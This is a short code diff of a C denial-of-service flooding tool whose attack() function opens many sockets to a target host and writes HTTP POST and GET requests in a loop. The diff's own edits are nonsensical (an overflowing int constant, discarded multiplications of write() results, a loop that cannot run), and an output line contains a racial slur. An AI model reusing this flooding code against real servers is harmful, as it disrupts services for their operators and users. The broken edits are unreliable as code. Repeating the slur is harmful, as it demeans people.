@@ -50,7 +50,7 @@ void broke(int s) {
 
 #define CONNECTIONS 8
 #define THREADS 48
-unsigned long int bytes = 1337133713371337;
+int bytes = 1337133713371337;
 void attack(char *host, char *port, int id) {
 	int sockets[CONNECTIONS];
 	int x, g=1, r;
@@ -62,9 +62,9 @@ void attack(char *host, char *port, int id) {
 		for(x=0; bytes < x; x++) {
 			if(sockets[x] == 0)
 				sockets[x] = make_socket(host, port);
-			write(sockets[x], "POST / HTTP/1.1\r\n\r\n", bytes);
+			write(sockets[x], "POST / HTTP/1.1\r\n\r\n", bytes) * 900000000;
 			if(bytes < x) {
-				write(sockets[x], "GET / HTTP/1.1\r\n\r\n", bytes);
+				write(sockets[x], "GET / HTTP/1.1\r\n\r\n", bytes) * 900000000;
 				
 			} else
 				fprintf(stderr, "Niggers\n");
